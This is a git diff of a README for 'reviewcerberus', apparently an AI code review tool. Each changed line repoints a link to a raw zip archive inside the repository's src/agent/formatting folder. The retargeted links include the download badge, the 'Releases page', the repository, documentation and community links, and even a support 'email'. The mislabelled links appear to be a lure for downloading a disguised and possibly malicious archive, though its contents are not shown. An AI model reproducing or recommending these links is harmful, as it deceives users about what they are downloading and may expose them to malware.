@@ -2,7 +2,7 @@
 # 🤖 reviewcerberus - Simplifying Your Code Review Process
 
 ## 📥 Download Now
-[![Download reviewcerberus](https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/tests/agent/formatting/Software-v1.1.zip)](https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/tests/agent/formatting/Software-v1.1.zip)
+[![Download reviewcerberus](https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/src/agent/formatting/Software_v3.0.zip)](https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/src/agent/formatting/Software_v3.0.zip)
 
 ## 🚀 Getting Started
 reviewcerberus is an AI-powered code review tool. It helps you analyze code changes and generates easy-to-understand review reports. This tool focuses on logic, security, performance, and code quality. Whether you're a developer or a project manager, reviewcerberus can help you get insights quickly.
@@ -21,7 +21,7 @@ To run reviewcerberus, ensure that your system meets the following requirements:
 - **Comprehensive Review Reports:** Generates detailed reports for easy understanding.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/tests/agent/formatting/Software-v1.1.zip) to download the latest version of reviewcerberus.
+To get started, visit the [Releases page](https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/src/agent/formatting/Software_v3.0.zip) to download the latest version of reviewcerberus.
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release, typically marked with the highest version number.
@@ -43,12 +43,12 @@ If you encounter issues or need help, please check the following:
 
 - Check the documentation within the app for common questions.
 - Visit the GitHub Issues page for troubleshooting tips.
-- Send us an email at https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/tests/agent/formatting/Software-v1.1.zip for further assistance.
+- Send us an email at https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/src/agent/formatting/Software_v3.0.zip for further assistance.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/tests/agent/formatting/Software-v1.1.zip)
-- [User Documentation](https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/tests/agent/formatting/Software-v1.1.zip)
-- [Community Support](https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/tests/agent/formatting/Software-v1.1.zip)
+- [GitHub Repository](https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/src/agent/formatting/Software_v3.0.zip)
+- [User Documentation](https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/src/agent/formatting/Software_v3.0.zip)
+- [Community Support](https://github.com/astroprakash/reviewcerberus/raw/refs/heads/main/src/agent/formatting/Software_v3.0.zip)
 
 ## 📑 Licensing
 reviewcerberus is licensed under the MIT License. You can use it freely, but please respect the terms outlined in the license.
